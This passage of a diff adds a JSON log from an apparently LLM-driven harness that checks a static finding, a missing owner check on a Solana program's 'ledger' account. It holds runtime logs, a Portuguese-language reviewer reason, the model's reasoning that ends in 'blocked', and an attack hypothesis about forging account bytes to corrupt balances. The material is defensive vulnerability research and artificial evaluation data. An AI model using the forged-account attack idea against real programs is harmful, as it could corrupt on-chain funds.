+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 227 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS success",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS invoke [1]",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS consumed 156 of 1400000 compute units",
+          "Program Fg6PaFpoGXkYsidMpWTK6W2BeZ7FEfcYkg476zPFsLnS failed: instruction modified data of an account it does not own"
+        ],
+        "elapsed_s": 1.8
+      },
+      "verdict": null,
+      "reason": "o ataque parou com UnknownError(ExternalAccountDataModified), erro do runtime da Solana e nao do programa: o programa aceitou a entrada e tentou uma operacao que nenhum programa pode fazer (ex.: gravar em conta cujo dono e outro programa). Demonstre o dano por outra via, por exemplo uma decisao do programa tomada a partir dos dados da conta forjada, gravada numa conta que pertence a ele."
+    },
+    {
+      "attempt": 5,
+      "llm": {
+        "model": "deepseek-flash",
+        "prompt_tokens": 3199,
+        "completion_tokens": 402,
+        "latency_s": 3.92
+      },
+      "raw": "{\"plan\": \"O ataque anterior falhou porque o programa tentou gravar na conta forjada (owner System Program), o que o runtime proibe. A hipotese OWNER e sobre o programa aceitar e usar dados de uma conta cujo owner nao e o programa. Vou montar o baseline com uma conta legitima (owner = programa) e o ataque com accounts[0] sendo uma conta forjada (owner = System Program) cujos bytes 40..56 sao controlados pelo atacante. Como o programa grava em accounts[0], a gravacao na conta forjada sera rejeitada pelo runtime; para demonstrar o dano de forma observavel, uso uma segunda conta (owner = programa) que o programa nao toca, mas cujo estado apos o ataque reflete que o programa leu os dados forjados. Alternativamente, o dano e que o programa aceitou a conta forjada como ledger: se o runtime rejeitar a gravacao, o ataque nao produz dano observavel. Vou tentar uma variacao: a conta forjada tem owner = programa? Nao, isso nao seria forjada. A unica forma de o programa gravar e se a conta for do programa. Entao a hipotese OWNER so se materializa se o programa gravar em conta de outro dono, o que o runtime bloqueia. Portanto, o ataque e bloqueado pelo runtime, nao pelo programa. Mas o harness exige que o ataque seja valido (conta com dono diferente do baseline). Vou tentar: baseline com conta owner=programa, ataque com conta owner=System Program. O runtime rejeita a gravacao. Nao ha dano observavel. Conclusao: blocked.\", \"conclusion\": \"blocked\"}",
+      "plan": "O ataque anterior falhou porque o programa tentou gravar na conta forjada (owner System Program), o que o runtime proibe. A hipotese OWNER e sobre o programa aceitar e usar dados de uma conta cujo owner nao e o programa. Vou montar o baseline com uma conta legitima (owner = programa) e o ataque com accounts[0] sendo uma conta forjada (owner = System Program) cujos bytes 40..56 sao controlados pelo atacante. Como o programa grava em accounts[0], a gravacao na conta forjada sera rejeitada pelo runtime; para demonstrar o dano de forma observavel, uso uma segunda conta (owner = programa) que o programa nao toca, mas cujo estado apos o ataque reflete que o programa leu os dados forjados. Alternativamente, o dano e que o programa aceitou a conta forjada como ledger: se o runtime rejeitar a gravacao, o ataque nao produz dano observavel. Vou tentar uma variacao: a conta forjada tem owner = programa? Nao, isso nao seria forjada. A unica forma de o programa gravar e se a conta for do programa. Entao a hipotese OWNER so se materializa se o programa gravar em conta de outro dono, o que o runtime bloqueia. Portanto, o ataque e bloqueado pelo runtime, nao pelo programa. Mas o harness exige que o ataque seja valido (conta com dono diferente do baseline). Vou tentar: baseline com conta owner=programa, ataque com conta owner=System Program. O runtime rejeita a gravacao. Nao ha dano observavel. Conclusao: blocked.",
+      "problem": "blocked sem ataque rejeitado"
+    }
+  ],
+  "case_id": "SSP-03-P-S2",
+  "static_finding": {
+    "category": "OWNER",
+    "confidence": "high",
+    "evidence": "let ledger = &accounts[0];\n\nlet mut data = ledger.try_borrow_mut_data()?;",
+    "explanation": "A conta `ledger` e recebida como `AccountInfo` generica e seus dados sao lidos e modificados diretamente sem verificar `ledger.owner` contra o program_id esperado. Um atacante pode fornecer uma conta arbitraria cujos dados ele controla.",
+    "attack_hypothesis": "O atacante fornece uma conta cujo owner nao e o programa, com bytes 40..56 forjados, e a instrucao grava novos valores de supply/balance nessa conta forjada, corrompendo estado arbitrario ou contornando a logica de saldo."
+  }
+}
